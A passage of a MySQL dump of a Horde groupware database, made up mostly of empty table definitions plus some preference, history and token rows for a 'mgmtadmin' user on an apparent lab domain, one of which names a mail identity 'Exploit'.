/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_histories`
--

LOCK TABLES `horde_histories` WRITE;
/*!40000 ALTER TABLE `horde_histories` DISABLE KEYS */;
INSERT INTO `horde_histories` VALUES (1,'turba:FQtn-yoFHv03iQh6iK8v9WU:20170605225755.qFPIIcdfl5EUqPZoimsfPUs@mail.metropolis-general.com','add',1496703475,NULL,'mgmtadmin',NULL,1),(2,'turba:FQtn-yoFHv03iQh6iK8v9WU:20170605230311.iuxg_zuuiXpAJNn59LzI28t@mail.metropolis-general.com','add',1496703791,NULL,'mgmtadmin',NULL,2),(3,'turba:FQtn-yoFHv03iQh6iK8v9WU:20170605230836.2za6kjJSWovaOLUwbNSxBy0@mail.metropolis-general.com','add',1496704116,NULL,'mgmtadmin',NULL,3),(4,'turba:FQtn-yoFHv03iQh6iK8v9WU:20170605230836.2za6kjJSWovaOLUwbNSxBy0@mail.metropolis-general.com','modify',1496705088,NULL,'mgmtadmin',NULL,6);
/*!40000 ALTER TABLE `horde_histories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_histories_modseq`
--

DROP TABLE IF EXISTS `horde_histories_modseq`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_histories_modseq` (
  `history_modseq` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `history_modseqempty` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`history_modseq`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_histories_modseq`
--

LOCK TABLES `horde_histories_modseq` WRITE;
/*!40000 ALTER TABLE `horde_histories_modseq` DISABLE KEYS */;
INSERT INTO `horde_histories_modseq` VALUES (1,0),(2,0),(3,0),(4,0),(5,0),(6,0);
/*!40000 ALTER TABLE `horde_histories_modseq` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_history_schema_info`
--

DROP TABLE IF EXISTS `horde_history_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_history_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_history_schema_info`
--

LOCK TABLES `horde_history_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_history_schema_info` DISABLE KEYS */;
INSERT INTO `horde_history_schema_info` VALUES (6);
/*!40000 ALTER TABLE `horde_history_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_imap_client_data`
--

DROP TABLE IF EXISTS `horde_imap_client_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_imap_client_data` (
  `messageid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `hostspec` varchar(255) NOT NULL,
  `mailbox` varchar(255) NOT NULL,
  `modified` bigint(20) DEFAULT NULL,
  `port` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  PRIMARY KEY (`messageid`),
  KEY `index_horde_imap_client_data_on_hostspec_and_mailbox_and_port_an` (`hostspec`,`mailbox`,`port`,`username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_imap_client_data`
--

LOCK TABLES `horde_imap_client_data` WRITE;
/*!40000 ALTER TABLE `horde_imap_client_data` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_imap_client_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_imap_client_message`
--

DROP TABLE IF EXISTS `horde_imap_client_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_imap_client_message` (
  `data` longblob,
  `msguid` varchar(255) NOT NULL,
  `messageid` bigint(20) NOT NULL,
  KEY `index_horde_imap_client_message_on_msguid_and_messageid` (`msguid`,`messageid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_imap_client_message`
--

LOCK TABLES `horde_imap_client_message` WRITE;
/*!40000 ALTER TABLE `horde_imap_client_message` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_imap_client_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_imap_client_metadata`
--

DROP TABLE IF EXISTS `horde_imap_client_metadata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_imap_client_metadata` (
  `data` longblob,
  `field` varchar(255) NOT NULL,
  `messageid` bigint(20) NOT NULL,
  KEY `index_horde_imap_client_metadata_on_messageid` (`messageid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_imap_client_metadata`
--

LOCK TABLES `horde_imap_client_metadata` WRITE;
/*!40000 ALTER TABLE `horde_imap_client_metadata` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_imap_client_metadata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_imap_client_schema_info`
--

DROP TABLE IF EXISTS `horde_imap_client_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_imap_client_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_imap_client_schema_info`
--

LOCK TABLES `horde_imap_client_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_imap_client_schema_info` DISABLE KEYS */;
INSERT INTO `horde_imap_client_schema_info` VALUES (2);
/*!40000 ALTER TABLE `horde_imap_client_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_lock_schema_info`
--

DROP TABLE IF EXISTS `horde_lock_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_lock_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_lock_schema_info`
--

LOCK TABLES `horde_lock_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_lock_schema_info` DISABLE KEYS */;
INSERT INTO `horde_lock_schema_info` VALUES (3);
/*!40000 ALTER TABLE `horde_lock_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_locks`
--

DROP TABLE IF EXISTS `horde_locks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_locks` (
  `lock_id` varchar(36) NOT NULL,
  `lock_owner` varchar(255) NOT NULL,
  `lock_scope` varchar(32) NOT NULL,
  `lock_principal` varchar(255) NOT NULL,
  `lock_origin_timestamp` bigint(20) NOT NULL,
  `lock_update_timestamp` bigint(20) NOT NULL,
  `lock_expiry_timestamp` bigint(20) NOT NULL,
  `lock_type` smallint(5) unsigned NOT NULL,
  PRIMARY KEY (`lock_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_locks`
--

LOCK TABLES `horde_locks` WRITE;
/*!40000 ALTER TABLE `horde_locks` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_locks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_metar_airports`
--

DROP TABLE IF EXISTS `horde_metar_airports`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_metar_airports` (
  `id` int(11) NOT NULL DEFAULT '0',
  `icao` varchar(4) DEFAULT NULL,
  `name` varchar(80) DEFAULT NULL,
  `state` varchar(4) DEFAULT NULL,
  `country` varchar(50) DEFAULT NULL,
  `municipality` varchar(80) DEFAULT NULL,
  `latitude` float DEFAULT '0',
  `longitude` float DEFAULT '0',
  `elevation` float DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_metar_airports`
--

LOCK TABLES `horde_metar_airports` WRITE;
/*!40000 ALTER TABLE `horde_metar_airports` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_metar_airports` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_muvfs`
--

DROP TABLE IF EXISTS `horde_muvfs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_muvfs` (
  `vfs_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `vfs_type` smallint(5) unsigned NOT NULL,
  `vfs_path` varchar(255) DEFAULT NULL,
  `vfs_name` varchar(255) NOT NULL,
  `vfs_modified` bigint(20) NOT NULL,
  `vfs_owner` varchar(255) DEFAULT NULL,
  `vfs_perms` smallint(5) unsigned NOT NULL,
  `vfs_data` longblob,
  PRIMARY KEY (`vfs_id`),
  KEY `index_horde_muvfs_on_vfs_path` (`vfs_path`),
  KEY `index_horde_muvfs_on_vfs_name` (`vfs_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_muvfs`
--

LOCK TABLES `horde_muvfs` WRITE;
/*!40000 ALTER TABLE `horde_muvfs` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_muvfs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_perms`
--

DROP TABLE IF EXISTS `horde_perms`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_perms` (
  `perm_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `perm_name` varchar(255) NOT NULL,
  `perm_parents` varchar(255) DEFAULT NULL,
  `perm_data` text,
  PRIMARY KEY (`perm_id`),
  UNIQUE KEY `index_horde_perms_on_perm_name` (`perm_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_perms`
--

LOCK TABLES `horde_perms` WRITE;
/*!40000 ALTER TABLE `horde_perms` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_perms` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_perms_schema_info`
--

DROP TABLE IF EXISTS `horde_perms_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_perms_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_perms_schema_info`
--

LOCK TABLES `horde_perms_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_perms_schema_info` DISABLE KEYS */;
INSERT INTO `horde_perms_schema_info` VALUES (3);
/*!40000 ALTER TABLE `horde_perms_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_prefs`
--

DROP TABLE IF EXISTS `horde_prefs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_prefs` (
  `pref_uid` varchar(255) NOT NULL,
  `pref_scope` varchar(16) NOT NULL DEFAULT '',
  `pref_name` varchar(32) NOT NULL,
  `pref_value` longblob,
  PRIMARY KEY (`pref_uid`,`pref_scope`,`pref_name`),
  KEY `index_horde_prefs_on_pref_uid` (`pref_uid`),
  KEY `index_horde_prefs_on_pref_scope` (`pref_scope`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_prefs`
--

LOCK TABLES `horde_prefs` WRITE;
/*!40000 ALTER TABLE `horde_prefs` DISABLE KEYS */;
INSERT INTO `horde_prefs` VALUES ('Administrator','kronolith','default_share','CnHSSSn4PgtK6fI18evE6KU'),('Administrator','kronolith','display_cals','a:1:{i:0;s:23:\"CnHSSSn4PgtK6fI18evE6KU\";}'),('Administrator','kronolith','display_external_cals','a:1:{i:0;s:29:\"tasks/1huILBj16xbH5EwqlOwaxgO\";}'),('Administrator','mnemo','default_notepad','zvbysqO5iuxsEYK9EH0MUQG'),('Administrator','mnemo','display_notepads','a:1:{i:0;s:23:\"zvbysqO5iuxsEYK9EH0MUQG\";}'),('Administrator','nag','default_tasklist','1huILBj16xbH5EwqlOwaxgO'),('Administrator','nag','display_tasklists','a:1:{i:0;s:23:\"1huILBj16xbH5EwqlOwaxgO\";}'),('Administrator','turba','default_dir','W7-zS-I98-PW3bjJ1UX24sZ'),('mgmtadmin','horde','identities','a:2:{i:0;a:7:{s:16:\"default_identity\";i:0;s:9:\"from_addr\";s:21:\"mgmtadmin@metropolis-general.com\";s:8:\"fullname\";s:0:\"\";s:2:\"id\";s:16:\"Default Identity\";s:10:\"identities\";s:6:\"a:0:{}\";s:10:\"properties\";N;s:8:\"location\";s:0:\"\";}i:1;a:4:{s:2:\"id\";s:7:\"Exploit\";s:8:\"fullname\";s:0:\"\";s:9:\"from_addr\";s:24:\"mymailboxwithPGP@any.com\";s:8:\"location\";s:0:\"\";}}'),('mgmtadmin','horde','last_login','a:2:{s:4:\"host\";s:15:\"192.168.203.190\";s:4:\"time\";i:1496702924;}'),('mgmtadmin','horde','last_logintasks','a:3:{s:5:\"horde\";i:1496702924;s:3:\"imp\";i:1496702961;s:5:\"turba\";i:1496703739;}'),('mgmtadmin','horde','upgrade_tasks','a:4:{s:5:\"horde\";s:6:\"5.2.15\";s:3:\"imp\";s:6:\"6.2.19\";s:8:\"imp_auth\";s:6:\"6.2.19\";s:5:\"turba\";s:6:\"4.2.19\";}'),('mgmtadmin','imp','delhide','1'),('mgmtadmin','imp','pgp_verify','1'),('mgmtadmin','imp','use_pgp','1'),('mgmtadmin','kronolith','default_share','eA0g0r_C8CgURv-sUjTOSVC'),('mgmtadmin','kronolith','display_cals','a:1:{i:0;s:23:\"eA0g0r_C8CgURv-sUjTOSVC\";}'),('mgmtadmin','kronolith','display_external_cals','a:1:{i:0;s:29:\"tasks/CSnKjFW2sfRDp13sNfC7ri9\";}'),('mgmtadmin','mnemo','default_notepad','PfoFOKBLzXazxG3d6ljW_ZU'),('mgmtadmin','mnemo','display_notepads','a:1:{i:0;s:23:\"PfoFOKBLzXazxG3d6ljW_ZU\";}'),('mgmtadmin','nag','default_tasklist','CSnKjFW2sfRDp13sNfC7ri9'),('mgmtadmin','nag','display_tasklists','a:1:{i:0;s:23:\"CSnKjFW2sfRDp13sNfC7ri9\";}'),('mgmtadmin','turba','columns','localsql'),('mgmtadmin','turba','default_dir','FQtn-yoFHv03iQh6iK8v9WU');
/*!40000 ALTER TABLE `horde_prefs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_prefs_schema_info`
--

DROP TABLE IF EXISTS `horde_prefs_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_prefs_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_prefs_schema_info`
--

LOCK TABLES `horde_prefs_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_prefs_schema_info` DISABLE KEYS */;
INSERT INTO `horde_prefs_schema_info` VALUES (3);
/*!40000 ALTER TABLE `horde_prefs_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_queue_schema_info`
--

DROP TABLE IF EXISTS `horde_queue_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_queue_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_queue_schema_info`
--

LOCK TABLES `horde_queue_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_queue_schema_info` DISABLE KEYS */;
INSERT INTO `horde_queue_schema_info` VALUES (1);
/*!40000 ALTER TABLE `horde_queue_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_queue_tasks`
--

DROP TABLE IF EXISTS `horde_queue_tasks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_queue_tasks` (
  `task_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `task_queue` varchar(255) NOT NULL,
  `task_fields` text NOT NULL,
  PRIMARY KEY (`task_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_queue_tasks`
--

LOCK TABLES `horde_queue_tasks` WRITE;
/*!40000 ALTER TABLE `horde_queue_tasks` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_queue_tasks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_service_weather_schema_info`
--

DROP TABLE IF EXISTS `horde_service_weather_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_service_weather_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_service_weather_schema_info`
--

LOCK TABLES `horde_service_weather_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_service_weather_schema_info` DISABLE KEYS */;
INSERT INTO `horde_service_weather_schema_info` VALUES (2);
/*!40000 ALTER TABLE `horde_service_weather_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_sessionhandler`
--

DROP TABLE IF EXISTS `horde_sessionhandler`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_sessionhandler` (
  `session_id` varchar(32) NOT NULL,
  `session_lastmodified` int(11) NOT NULL,
  `session_data` longblob,
  PRIMARY KEY (`session_id`),
  KEY `index_horde_sessionhandler_on_session_lastmodified` (`session_lastmodified`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_sessionhandler`
--

LOCK TABLES `horde_sessionhandler` WRITE;
/*!40000 ALTER TABLE `horde_sessionhandler` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_sessionhandler` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_sessionhandler_schema_info`
--

DROP TABLE IF EXISTS `horde_sessionhandler_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_sessionhandler_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_sessionhandler_schema_info`
--

LOCK TABLES `horde_sessionhandler_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_sessionhandler_schema_info` DISABLE KEYS */;
INSERT INTO `horde_sessionhandler_schema_info` VALUES (2);
/*!40000 ALTER TABLE `horde_sessionhandler_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_signups`
--

DROP TABLE IF EXISTS `horde_signups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_signups` (
  `user_name` varchar(255) NOT NULL,
  `signup_date` int(11) NOT NULL,
  `signup_host` varchar(255) NOT NULL,
  `signup_data` text NOT NULL,
  PRIMARY KEY (`user_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_signups`
--

LOCK TABLES `horde_signups` WRITE;
/*!40000 ALTER TABLE `horde_signups` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_signups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_syncml_anchors`
--

DROP TABLE IF EXISTS `horde_syncml_anchors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_syncml_anchors` (
  `syncml_syncpartner` varchar(255) NOT NULL,
  `syncml_db` varchar(255) NOT NULL,
  `syncml_uid` varchar(255) NOT NULL,
  `syncml_clientanchor` varchar(255) DEFAULT NULL,
  `syncml_serveranchor` varchar(255) DEFAULT NULL,
  KEY `index_horde_syncml_anchors_on_syncml_syncpartner` (`syncml_syncpartner`),
  KEY `index_horde_syncml_anchors_on_syncml_db` (`syncml_db`),
  KEY `index_horde_syncml_anchors_on_syncml_uid` (`syncml_uid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_syncml_anchors`
--

LOCK TABLES `horde_syncml_anchors` WRITE;
/*!40000 ALTER TABLE `horde_syncml_anchors` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_syncml_anchors` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_syncml_map`
--

DROP TABLE IF EXISTS `horde_syncml_map`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_syncml_map` (
  `syncml_syncpartner` varchar(255) NOT NULL,
  `syncml_db` varchar(255) NOT NULL,
  `syncml_uid` varchar(255) NOT NULL,
  `syncml_cuid` varchar(255) DEFAULT NULL,
  `syncml_suid` varchar(255) DEFAULT NULL,
  `syncml_timestamp` int(11) DEFAULT NULL,
  KEY `index_horde_syncml_map_on_syncml_syncpartner` (`syncml_syncpartner`),
  KEY `index_horde_syncml_map_on_syncml_db` (`syncml_db`),
  KEY `index_horde_syncml_map_on_syncml_uid` (`syncml_uid`),
  KEY `index_horde_syncml_map_on_syncml_cuid` (`syncml_cuid`),
  KEY `index_horde_syncml_map_on_syncml_suid` (`syncml_suid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_syncml_map`
--

LOCK TABLES `horde_syncml_map` WRITE;
/*!40000 ALTER TABLE `horde_syncml_map` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_syncml_map` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_syncml_schema_info`
--

DROP TABLE IF EXISTS `horde_syncml_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_syncml_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_syncml_schema_info`
--

LOCK TABLES `horde_syncml_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_syncml_schema_info` DISABLE KEYS */;
INSERT INTO `horde_syncml_schema_info` VALUES (1);
/*!40000 ALTER TABLE `horde_syncml_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_token_schema_info`
--

DROP TABLE IF EXISTS `horde_token_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_token_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_token_schema_info`
--

LOCK TABLES `horde_token_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_token_schema_info` DISABLE KEYS */;
INSERT INTO `horde_token_schema_info` VALUES (1);
/*!40000 ALTER TABLE `horde_token_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_tokens`
--

DROP TABLE IF EXISTS `horde_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_tokens` (
  `token_address` varchar(100) NOT NULL,
  `token_id` varchar(32) NOT NULL,
  `token_timestamp` bigint(20) NOT NULL,
  PRIMARY KEY (`token_address`,`token_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_tokens`
--

LOCK TABLES `horde_tokens` WRITE;
/*!40000 ALTER TABLE `horde_tokens` DISABLE KEYS */;
INSERT INTO `horde_tokens` VALUES ('MTkyLjE2OC4yMDMuMTkw','C6K7uB3HNeoTuxFezdZw-bCRaws',1496704217),('MTkyLjE2OC4yMDMuMTkw','dk_X7HvtcXy0t6Hem-N6UII-h70',1496704425),('MTkyLjE2OC4yMDMuMTkw','itHuOFT52fI2WIt_Tv-2Ecx28do',1496705088),('MTkyLjE2OC4yMDMuMTkw','JX6iHQe5Y7JhVqYFv2Kx-d5PNno',1496693794),('MTkyLjE2OC4yMDMuMTkw','MdqI40N0iIvSovLJIQb3G1Oj0XQ',1496704299),('MTkyLjE2OC4yMDMuMTkw','NkL41tO3385kHHG6-8hFRozpME4',1496704116),('MTkyLjE2OC4yMDMuMTkw','tYLiONyP63783P3D3TgBW1zw2H0',1496702025),('MTkyLjE2OC4yMDMuMTkw','wIYkWIDbu_5Mp4O4iGknnRKUvFA',1496703791),('MTkyLjE2OC4yMDMuMTkw','zJg8A6dr7MR10KgsPoeKMkniIKI',1496693818);
/*!40000 ALTER TABLE `horde_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_users`
--

DROP TABLE IF EXISTS `horde_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_users` (
  `user_uid` varchar(255) NOT NULL,
  `user_pass` varchar(255) NOT NULL,
  `user_soft_expiration_date` int(11) DEFAULT NULL,
  `user_hard_expiration_date` int(11) DEFAULT NULL,
  PRIMARY KEY (`user_uid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_users`
--

LOCK TABLES `horde_users` WRITE;
/*!40000 ALTER TABLE `horde_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_vfs`
--

DROP TABLE IF EXISTS `horde_vfs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_vfs` (
  `vfs_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `vfs_type` smallint(5) unsigned NOT NULL,
  `vfs_path` varchar(255) DEFAULT NULL,
  `vfs_name` varchar(255) NOT NULL,
  `vfs_modified` bigint(20) NOT NULL,
  `vfs_owner` varchar(255) DEFAULT NULL,
  `vfs_data` longblob,
  PRIMARY KEY (`vfs_id`),
  KEY `index_horde_vfs_on_vfs_path` (`vfs_path`),
  KEY `index_horde_vfs_on_vfs_name` (`vfs_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_vfs`
--

LOCK TABLES `horde_vfs` WRITE;
/*!40000 ALTER TABLE `horde_vfs` DISABLE KEYS */;
/*!40000 ALTER TABLE `horde_vfs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `horde_vfs_schema_info`
--

DROP TABLE IF EXISTS `horde_vfs_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `horde_vfs_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `horde_vfs_schema_info`
--

LOCK TABLES `horde_vfs_schema_info` WRITE;
/*!40000 ALTER TABLE `horde_vfs_schema_info` DISABLE KEYS */;
INSERT INTO `horde_vfs_schema_info` VALUES (4);
/*!40000 ALTER TABLE `horde_vfs_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `imp_schema_info`
--

DROP TABLE IF EXISTS `imp_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `imp_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `imp_schema_info`
--

LOCK TABLES `imp_schema_info` WRITE;
/*!40000 ALTER TABLE `imp_schema_info` DISABLE KEYS */;
INSERT INTO `imp_schema_info` VALUES (3);
/*!40000 ALTER TABLE `imp_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `imp_sentmail`
--

DROP TABLE IF EXISTS `imp_sentmail`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
